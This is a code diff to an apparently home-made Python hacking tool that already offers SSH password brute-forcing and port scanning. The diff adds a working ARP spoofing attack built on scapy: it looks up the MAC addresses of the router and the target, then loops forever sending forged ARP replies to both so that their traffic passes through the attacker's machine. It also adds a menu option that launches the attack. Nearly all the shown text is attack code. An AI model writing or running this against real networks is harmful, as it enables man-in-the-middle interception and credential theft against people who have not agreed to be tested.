@@ -104,15 +104,44 @@ def ssh_brute_force(target, account_username, password):
         #print(e)
         #remove comments to print exception encountered.
         print("wrong password " + str(password))
+        
+def spoofing_parameters(target_ip_address):
+    router_ip_address = input("Enter router ip address: ")
+    router_mac_address = get_mac_address(router_ip_address)
+    target_mac_address = get_mac_address(target_ip_address)
+    try:
+        while True:
+            arp_spoofing_packet_handling(router_ip_address, target_ip_address, router_mac_address, target_mac_address)
+            time.sleep(0.5)
+    except KeyboardInterrupt:
+        print("Closing Arp spoofing attack")
+        exit(0)
+
+
+def get_mac_address(device_ip):
+    ether_layer = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_layer = scapy.ARP(pdst=device_ip)
+    get_packet_response = ether_layer/arp_layer
+    response_packet = scapy.srp(get_packet_response, timeout=2, verbose=False)[0]
+    return response_packet[0][1].hwsrc
+
+
+def arp_spoofing_packet_handling(ip_router, ip_target, mac_router, mac_target):
+    packet_to_router = scapy.ARP(op=2, hwdst=mac_router, pdst=ip_router, psrc=ip_target)
+    packet_to_target = scapy.ARP(op=2, hwdst=mac_target, pdst=ip_target, psrc=ip_router)
+    scapy.send(packet_to_router)
+    scapy.send(packet_to_target)
 
 
 target = str(sys.argv[1])
 confirmed_ip = check_ip(target)
-answer = input("SSH or Port Scanning(p). (s/p)? ")
+answer = input("SSH(s), Port Scanning(p), or arpspoofing(a) (s/p)? ")
 if answer.lower() == "s":
     ssh_brute_force_parameters()
 elif answer.lower() == "p":
     port_scanning()
+elif answer.lower() == "a":
+    spoofing_parameters(target)
 else:
     print("Invalid Choice")
     sys.exit(1)
